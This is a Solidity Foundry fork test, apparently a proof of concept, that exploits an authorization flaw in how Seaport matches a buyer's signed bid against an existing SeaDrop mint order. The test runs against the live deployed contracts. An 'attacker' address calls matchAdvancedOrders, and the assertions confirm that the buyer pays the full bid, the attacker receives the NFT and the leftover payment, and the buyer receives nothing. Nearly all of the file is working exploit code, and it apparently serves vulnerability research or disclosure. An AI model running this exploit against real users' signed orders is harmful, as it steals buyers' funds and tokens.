// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {
    AdvancedOrder,
    ConsiderationItem,
    CriteriaResolver,
    Fulfillment,
    FulfillmentComponent,
    IConduit,
    IConduitController,
    IERC1155View,
    ItemType,
    LabWETH,
    OfferItem,
    Order,
    OrderComponents,
    OrderParameters,
    OrderType,
    ReceivedItem
} from "./OfficialFactoryFork.t.sol";

struct ExistingSpentItem {
    ItemType itemType;
    address token;
    uint256 identifier;
    uint256 amount;
}

interface IExistingSeaDropPreview {
    function previewOrder(
        address caller,
        address fulfiller,
        ExistingSpentItem[] calldata minimumReceived,
        ExistingSpentItem[] calldata maximumSpent,
        bytes calldata context
    ) external view returns (
        ExistingSpentItem[] memory offer,
        ReceivedItem[] memory consideration
    );
}

interface IERC20Existing {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract ActiveExistingDropForkTest is Test {
    address internal constant SEAPORT =
        0x0000000000000068F116a894984e2DB1123eB395;
    address internal constant CONTROLLER =
        0x00000000F9490004C11Cef243f5400493c00Ad63;
    address internal constant OPENSEA_CONDUIT =
        0x1e0049783f008a0085193e00003d00cd54003c71;
    bytes32 internal constant OPENSEA_CONDUIT_KEY =
        0x0000007b02230091a7c22b5bb0c9e86cdd3c13d1000000000000000000000000;
    bytes32 internal constant SEAPORT_RUNTIME_HASH =
        0x74499ac0cce14428e4b41541d5e44f28f5a6882a1051d0118867c2a93cd5aec0;

    uint256 internal constant BUYER_KEY = 0xB0B55EAD;
    address internal constant NEUTRAL_FEE_RECIPIENT = address(0xFEE123);

    ConsiderationInterfaceExisting internal constant seaport =
        ConsiderationInterfaceExisting(SEAPORT);

    address internal token;
    address internal paymentToken;
    address internal feeRecipient;
    address internal buyer;
    address internal attacker;
    uint256 internal tokenId;
    uint256 internal dropIndex;
    uint256 internal mintCost;
    uint256 internal bidAmount;
    ExistingSpentItem[] internal previewOffer;
    ReceivedItem[] internal previewConsideration;

    event ExistingDeploymentFingerprint(
        uint256 chainId,
        uint256 forkBlock,
        address token,
        bytes32 tokenCodeHash,
        address paymentToken,
        uint256 dropIndex,
        uint256 tokenId,
        bytes32 seaportCodeHash,
        bytes32 conduitCodeHash
    );

    event ExistingAuthorizationDelta(
        uint256 buyerPaymentLoss,
        uint256 requiredMintPayment,
        uint256 attackerResidualGain,
        uint256 buyerNftGain,
        uint256 attackerNftGain,
        bool validated,
        bool cancelled,
        uint256 filled,
        uint256 size
    );

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_URL"), vm.envUint("FORK_BLOCK"));
        token = vm.envAddress("ACTIVE_TOKEN");
        paymentToken = vm.envAddress("PAYMENT_TOKEN");
        feeRecipient = vm.envAddress("FEE_RECIPIENT");
        tokenId = vm.envUint("TOKEN_ID");
        dropIndex = vm.envUint("DROP_INDEX");
        attacker = makeAddr("unrelated-outsider-matcher");
        buyer = vm.addr(BUYER_KEY);

        assertEq(keccak256(SEAPORT.code), SEAPORT_RUNTIME_HASH, "Seaport runtime");
        assertGt(token.code.length, 0, "SeaDrop token missing");
        assertGt(paymentToken.code.length, 0, "payment token missing");
        assertGt(OPENSEA_CONDUIT.code.length, 0, "conduit missing");

        (address conduit, bool exists) = IConduitController(CONTROLLER)
            .getConduit(OPENSEA_CONDUIT_KEY);
        assertTrue(exists);
        assertEq(conduit, OPENSEA_CONDUIT);
        assertTrue(IConduit(OPENSEA_CONDUIT).getChannelStatus(SEAPORT));

        if (feeRecipient == address(0)) {
            feeRecipient = NEUTRAL_FEE_RECIPIENT;
        }

        ExistingSpentItem[] memory minimumReceived =
            new ExistingSpentItem[](1);
        minimumReceived[0] = ExistingSpentItem(
            ItemType.ERC1155,
            token,
            tokenId,
            1
        );
        ExistingSpentItem[] memory maximumSpent =
            new ExistingSpentItem[](1);
        maximumSpent[0] = ExistingSpentItem(
            ItemType.ERC20,
            paymentToken,
            0,
            type(uint128).max
        );

        (ExistingSpentItem[] memory generatedOffer, ReceivedItem[] memory generatedConsideration) =
            IExistingSeaDropPreview(token).previewOrder(
                SEAPORT,
                attacker,
                minimumReceived,
                maximumSpent,
                _context(address(0))
            );

        assertEq(generatedOffer.length, 1, "generated offer length");
        assertEq(uint256(generatedOffer[0].itemType), uint256(ItemType.ERC1155));
        assertEq(generatedOffer[0].token, token);
        assertEq(generatedOffer[0].identifier, tokenId);
        assertEq(generatedOffer[0].amount, 1);

        for (uint256 i; i < generatedConsideration.length; ++i) {
            assertEq(
                uint256(generatedConsideration[i].itemType),
                uint256(ItemType.ERC20),
                "native candidate requires converter"
            );
            assertEq(generatedConsideration[i].token, paymentToken);
            mintCost += generatedConsideration[i].amount;
        }

        bidAmount = mintCost == 0 ? 1 : mintCost + _max(mintCost / 5, 1);
        deal(paymentToken, buyer, bidAmount, true);
        vm.prank(buyer);
        assertTrue(IERC20Existing(paymentToken).approve(
            OPENSEA_CONDUIT,
            type(uint256).max
        ));

        emit ExistingDeploymentFingerprint(
            block.chainid,
            block.number,
            token,
            keccak256(token.code),
            paymentToken,
            dropIndex,
            tokenId,
            keccak256(SEAPORT.code),
            keccak256(OPENSEA_CONDUIT.code)
        );
    }

    function testExistingOwnerUnmodifiedOutsiderSettlementFailure() public {
        Order memory buyerOrder = _buyerOrder();
        bytes32 orderHash = _hash(buyerOrder.parameters);
        buyerOrder.signature = _signature(buyerOrder.parameters);

        AdvancedOrder[] memory advanced = new AdvancedOrder[](2);
        advanced[0] = AdvancedOrder(
            buyerOrder.parameters,
            1,
            1,
            buyerOrder.signature,
            bytes("")
        );
        advanced[1] = _seaDropOrder();

        Fulfillment[] memory fulfillments =
            _fulfillments(advanced[1].parameters.consideration.length);

        uint256 buyerPaymentBefore =
            IERC20Existing(paymentToken).balanceOf(buyer);
        uint256 attackerPaymentBefore =
            IERC20Existing(paymentToken).balanceOf(attacker);
        uint256 buyerNftBefore = IERC1155View(token).balanceOf(buyer, tokenId);
        uint256 attackerNftBefore =
            IERC1155View(token).balanceOf(attacker, tokenId);

        address[] memory recipients =
            new address[](advanced[1].parameters.consideration.length);
        uint256[] memory balancesBefore = new uint256[](recipients.length);
        uint256[] memory expectedByItem = new uint256[](recipients.length);
        for (uint256 i; i < recipients.length; ++i) {
            recipients[i] =
                advanced[1].parameters.consideration[i].recipient;
            balancesBefore[i] =
                IERC20Existing(paymentToken).balanceOf(recipients[i]);
            expectedByItem[i] =
                advanced[1].parameters.consideration[i].startAmount;
        }

        vm.prank(attacker);
        seaport.matchAdvancedOrders(
            advanced,
            new CriteriaResolver[](0),
            fulfillments,
            attacker
        );

        uint256 buyerPaymentAfter =
            IERC20Existing(paymentToken).balanceOf(buyer);
        uint256 attackerPaymentAfter =
            IERC20Existing(paymentToken).balanceOf(attacker);
        uint256 buyerNftAfter = IERC1155View(token).balanceOf(buyer, tokenId);
        uint256 attackerNftAfter =
            IERC1155View(token).balanceOf(attacker, tokenId);
        (bool validated, bool cancelled, uint256 filled, uint256 size) =
            seaport.getOrderStatus(orderHash);

        for (uint256 i; i < recipients.length; ++i) {
            uint256 aggregateExpected;
            for (uint256 j; j < recipients.length; ++j) {
                if (recipients[j] == recipients[i]) {
                    aggregateExpected += expectedByItem[j];
                }
            }
            assertGe(
                IERC20Existing(paymentToken).balanceOf(recipients[i]),
                balancesBefore[i] + aggregateExpected,
                "mint recipient underpaid"
            );
        }

        uint256 residual = bidAmount - mintCost;
        uint256 attackerExpected = residual;
        for (uint256 i; i < recipients.length; ++i) {
            if (recipients[i] == attacker) {
                attackerExpected += expectedByItem[i];
            }
        }

        emit ExistingAuthorizationDelta(
            buyerPaymentBefore - buyerPaymentAfter,
            mintCost,
            attackerPaymentAfter - attackerPaymentBefore,
            buyerNftAfter - buyerNftBefore,
            attackerNftAfter - attackerNftBefore,
            validated,
            cancelled,
            filled,
            size
        );

        assertEq(buyerPaymentAfter, buyerPaymentBefore - bidAmount);
        assertEq(
            attackerPaymentAfter,
            attackerPaymentBefore + attackerExpected,
            "attacker payment gain"
        );
        assertEq(buyerNftAfter, buyerNftBefore, "buyer received NFT");
        assertEq(attackerNftAfter, attackerNftBefore + 1, "attacker NFT");
        assertFalse(cancelled);
        assertEq(filled, 1);
        assertEq(size, 1);
    }

    function _buyerOrder() internal view returns (Order memory order) {
        OfferItem[] memory offer = new OfferItem[](1);
        offer[0] = OfferItem(
            ItemType.ERC20,
            paymentToken,
            0,
            bidAmount,
            bidAmount
        );
        ConsiderationItem[] memory consideration = new ConsiderationItem[](1);
        consideration[0] = ConsiderationItem(
            ItemType.ERC1155,
            token,
            tokenId,
            1,
            1,
            payable(buyer)
        );
        order = Order(
            OrderParameters(
                buyer,
                address(0),
                offer,
                consideration,
                OrderType.FULL_OPEN,
                0,
                type(uint256).max,
                bytes32(0),
                0xAC71CE,
                OPENSEA_CONDUIT_KEY,
                1
            ),
            bytes("")
        );
    }

    function _seaDropOrder()
        internal
        view
        returns (AdvancedOrder memory advanced)
    {
        ExistingSpentItem[] memory minimumReceived =
            new ExistingSpentItem[](1);
        minimumReceived[0] = ExistingSpentItem(
            ItemType.ERC1155,
            token,
            tokenId,
            1
        );
        ExistingSpentItem[] memory maximumSpent =
            new ExistingSpentItem[](1);
        maximumSpent[0] = ExistingSpentItem(
            ItemType.ERC20,
            paymentToken,
            0,
            bidAmount
        );
        (ExistingSpentItem[] memory generatedOffer, ReceivedItem[] memory generatedConsideration) =
            IExistingSeaDropPreview(token).previewOrder(
                SEAPORT,
                attacker,
                minimumReceived,
                maximumSpent,
                _context(address(0))
            );

        OfferItem[] memory offer = new OfferItem[](generatedOffer.length);
        for (uint256 i; i < generatedOffer.length; ++i) {
            offer[i] = OfferItem(
                generatedOffer[i].itemType,
                generatedOffer[i].token,
                generatedOffer[i].identifier,
                generatedOffer[i].amount,
                generatedOffer[i].amount
            );
        }
        ConsiderationItem[] memory consideration =
            new ConsiderationItem[](generatedConsideration.length);
        for (uint256 i; i < generatedConsideration.length; ++i) {
            consideration[i] = ConsiderationItem(
                generatedConsideration[i].itemType,
                generatedConsideration[i].token,
                generatedConsideration[i].identifier,
                generatedConsideration[i].amount,
                generatedConsideration[i].amount,
                generatedConsideration[i].recipient
            );
        }

        advanced = AdvancedOrder(
            OrderParameters(
                token,
                address(0),
                offer,
                consideration,
                OrderType.CONTRACT,
                0,
                type(uint256).max,
                bytes32(0),
                0,
                OPENSEA_CONDUIT_KEY,
                consideration.length
            ),
            1,
            1,
            bytes(""),
            _context(address(0))
        );
    }

    function _fulfillments(uint256 mintConsiderationLength)
        internal
        pure
        returns (Fulfillment[] memory fulfillments)
    {
        fulfillments = new Fulfillment[](2);

        FulfillmentComponent[] memory nftOffer = new FulfillmentComponent[](1);
        nftOffer[0] = FulfillmentComponent(1, 0);
        FulfillmentComponent[] memory nftConsideration =
            new FulfillmentComponent[](1);
        nftConsideration[0] = FulfillmentComponent(0, 0);
        fulfillments[0] = Fulfillment(nftOffer, nftConsideration);

        FulfillmentComponent[] memory paymentOffer =
            new FulfillmentComponent[](1);
        paymentOffer[0] = FulfillmentComponent(0, 0);
        FulfillmentComponent[] memory mintConsideration =
            new FulfillmentComponent[](mintConsiderationLength);
        for (uint256 i; i < mintConsiderationLength; ++i) {
            mintConsideration[i] = FulfillmentComponent(1, i);
        }
        fulfillments[1] = Fulfillment(paymentOffer, mintConsideration);
    }

    function _context(address minter) internal view returns (bytes memory context) {
        context = new bytes(74);
        context[0] = 0x00;
        context[1] = 0x00;
        _writeAddress(context, 2, feeRecipient);
        _writeAddress(context, 22, minter);
        assembly {
            mstore(add(add(context, 0x20), 42), dropIndex)
        }
    }

    function _signature(OrderParameters memory params)
        internal
        returns (bytes memory signature)
    {
        bytes32 orderHash = _hash(params);
        (, bytes32 domainSeparator,) = seaport.information();
        bytes32 digest = keccak256(
            abi.encodePacked(bytes2(0x1901), domainSeparator, orderHash)
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(BUYER_KEY, digest);
        signature = abi.encodePacked(r, s, v);
    }

    function _hash(OrderParameters memory params) internal view returns (bytes32) {
        return seaport.getOrderHash(
            OrderComponents(
                params.offerer,
                params.zone,
                params.offer,
                params.consideration,
                params.orderType,
                params.startTime,
                params.endTime,
                params.zoneHash,
                params.salt,
                params.conduitKey,
                seaport.getCounter(params.offerer)
            )
        );
    }

    function _writeAddress(bytes memory data, uint256 offset, address value)
        internal
        pure
    {
        assembly {
            mstore(add(add(data, 0x20), offset), shl(96, value))
        }
    }

    function _max(uint256 left, uint256 right)
        internal
        pure
        returns (uint256)
    {
        return left > right ? left : right;
    }
}

interface ConsiderationInterfaceExisting {
    function matchAdvancedOrders(
        AdvancedOrder[] calldata advancedOrders,
        CriteriaResolver[] calldata criteriaResolvers,
        Fulfillment[] calldata fulfillments,
        address recipient
    ) external payable returns (Execution[] memory executions);

    function getOrderHash(OrderComponents calldata order)
        external
        view
        returns (bytes32 orderHash);

    function getCounter(address offerer) external view returns (uint256 counter);

    function getOrderStatus(bytes32 orderHash)
        external
        view
        returns (
            bool isValidated,
            bool isCancelled,
            uint256 totalFilled,
            uint256 totalSize
        );

    function information()
        external
        view
        returns (string memory version, bytes32 domainSeparator, address controller);
}
